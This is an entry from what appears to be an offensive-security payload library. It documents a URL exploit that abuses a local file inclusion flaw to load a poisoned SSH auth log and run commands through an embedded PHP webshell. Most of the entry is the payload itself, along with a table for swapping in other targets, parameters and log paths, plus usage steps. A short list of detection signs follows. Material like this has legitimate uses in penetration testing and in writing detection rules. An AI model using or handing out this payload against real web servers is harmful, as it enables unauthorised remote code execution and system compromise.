---
id: ebe9b3eb-9756-4b42-b9d2-ff76cb96559f
name: LFI-URL-Execute-ID-Command
type: code
language: url
verified: true
created_at: '2023-04-06T03:55:58.577306+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - lfi
  - rce
  - exploitation
validated: true
---

# LFI-URL-Execute-ID-Command

## Code

```url
http://example.com/index.php?page=/var/log/auth.log&cmd=id
```

## Description

This URL exploits an LFI vulnerability to include the SSH log file containing an embedded PHP webshell and executes the 'id' command via the 'cmd' parameter, verifying RCE by displaying the server's user context in the response.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| example.com | Vulnerable web application domain | vulnerable-app.com |
| index.php?page= | LFI parameter path | vuln.php?file= |
| /var/log/auth.log | Path to poisoned log file | /var/log/secure |
| cmd=id | Command to execute via webshell | cmd=whoami |

## Usage

After poisoning the log, access this URL in a browser or via curl to trigger the inclusion and command execution. The response will show the output of 'id' if successful. Customize the base URL, parameter, and log path based on the target application. Use for testing RCE post-LFI exploitation.

## Detection

- Web access logs with traversal patterns like '../../../var/log/'.
- HTTP requests containing 'cmd=' parameters with shell commands.
- WAF alerts for LFI attempts targeting log files.

## Related

- [[procedures/LFI-to-RCE-via-SSH-Log-File-Inclusion]]
